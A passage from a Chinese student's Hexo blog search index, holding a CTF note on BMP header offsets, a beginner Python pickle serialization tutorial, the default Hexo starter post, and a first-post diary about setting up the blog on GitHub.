href="#4、BMP文件格式：" class="headerlink" title="4、BMP文件格式："></a>4、BMP文件格式：</h2><p>（1）文件结构如下：<br>BMP文件 &#x3D;  文件头信息块  +  图像描述信息块  +  颜色表  +  图像数据区<br>（2）关于文件头信息块，0000–000D，其中，【0000–0001】为2个字节的文件标识“BM”，【0002–0005】为4个字节的文件大小的值，【0006–0009】为4个字节的保留值，分别为【00 00 00 00】，【000A – 000D】为图像数据区的起始位置（偏移量），它的值等于前三个内容的大小的和。<br>另外，几个比较重要的位置有：【000A—000D】图像数据的起始位置，【0022–0025】图像数据的大小，【000E–0011】图像描述信息块大小，【0012–0015】图像宽度，【0016–0019】图像高度。</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>MISC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python对象以及将对象序列化</title>
    <link href="/blog/2018/07/30/Python-%E5%AF%B9%E8%B1%A1%E4%BB%A5%E5%8F%8A%E5%B0%86%E5%AF%B9%E8%B1%A1%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/blog/2018/07/30/Python-%E5%AF%B9%E8%B1%A1%E4%BB%A5%E5%8F%8A%E5%B0%86%E5%AF%B9%E8%B1%A1%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p><strong>今天开始继续学习一下python，熟悉一门脚本语言</strong><br><img src="/images/fengjing.jpg"></p><span id="more"></span><h2 id="Python对象类型"><a href="#Python对象类型" class="headerlink" title="Python对象类型"></a>Python对象类型</h2><p>  Python的内置的对象类型主要有数字、字符串、列表、元组、字典、集合等等。其实在Python中，一切皆为对象。</p><h2 id="pickle函数"><a href="#pickle函数" class="headerlink" title="pickle函数"></a>pickle函数</h2><h3 id="pickle腌制"><a href="#pickle腌制" class="headerlink" title="pickle腌制"></a>pickle腌制</h3><p><code>#dumps(object)将对象序列化</code><br><code>import pickle</code><br><code>lista=[&quot;mingyue&quot;,&quot;jishi&quot;,&quot;you&quot;]</code><br><code>listb=pickle.dumps(lista)</code><br><code>print listb</code></p><p><img src="/images/xuliehua.png"></p><p><code>#loads(string)将对象原样恢复，并且对象类型也恢复为原来的格式</code><br><code>listc=pickle.loads(listb)</code><br><code>print listc</code></p><p><img src="/images/fanxuliehua.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment">#dump(object,file),将对象存储到文件里面序列化</span><br>group1=(<span class="hljs-string">&quot;bajiu&quot;</span>,<span class="hljs-string">&quot;wen&quot;</span>,<span class="hljs-string">&quot;qingtian&quot;</span>)<br>f1=file(<span class="hljs-string">&#x27;1.txt&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>pickle.dump(group1,f1,<span class="hljs-literal">True</span>)<br>f1.close()<br></code></pre></td></tr></table></figure><p><code>#load(object,file)将dump()存储在文件里面的数据恢复</code><br><code>f2=file(&#39;1.txt&#39;,&#39;rb&#39;)</code><br><code>t=pickle.load(f2)</code><br><code>print t</code><br><code>f2.close()</code></p><h3 id="详解pickle"><a href="#详解pickle" class="headerlink" title="详解pickle"></a>详解pickle</h3><p>在Python中如果我们有一些对象需要持久性存储，并且不丢失我们这个对象的类型与数据，我们则需要将这些对象进行序列化，序列化之后，需要使用的时候，我们再恢复为原来的数据。序列化的这种过程，我们将其称为pickle。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>慢慢学吧，一口也吃不成大胖子，每天用时间去学习，一点点积累，慢慢进步，一步一步往上爬，坚持下去就好了~~~</p>]]></content>
    
    
    
    <tags>
      
      <tag>python学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/blog/2018/07/28/hello-world/"/>
    <url>/blog/2018/07/28/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>My First Blog</title>
    <link href="/blog/2018/07/28/My-First-Blog/"/>
    <url>/blog/2018/07/28/My-First-Blog/</url>
    
    <content type="html"><![CDATA[<p><strong>今天正式建立了博客，写一下留个纪念</strong><br>  <img src="/images/3.jpg"></p><span id="more"></span><h2 id="博客的建立"><a href="#博客的建立" class="headerlink" title="博客的建立"></a><strong>博客的建立</strong></h2><p>  在室友的怂恿下，决定搭建一个个人博客，顺便学点东西。服务器懒得花钱买了，于是就使用了GitHub上面的网页托管服务，免费使用，学着用用GitHub也挺好的。说干就是干，下载组件，查找教程，花了几个小时弄好了本地，上传到GitHub就出了问题。然后各种百度解决问题，没成功，最后重新配置ssh，不设置密码居然就好了，太神奇了。。。<br><img src="/images/1.png"></p><h2 id="它的用处"><a href="#它的用处" class="headerlink" title="它的用处"></a><strong>它的用处</strong></h2><p> 嗯，它就用来作为学习笔记吧，方便自己查找。亦可用作和其他同学技术交流，欢迎大家指正我的错误，不胜感激！</p><h2 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a><strong>感谢</strong></h2><p> 谢谢访问，现在水平还挺低，界面也不是多好看，以后慢慢学习，一直学习就好了。加油~~<br><img src="/images/2.jpg"></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
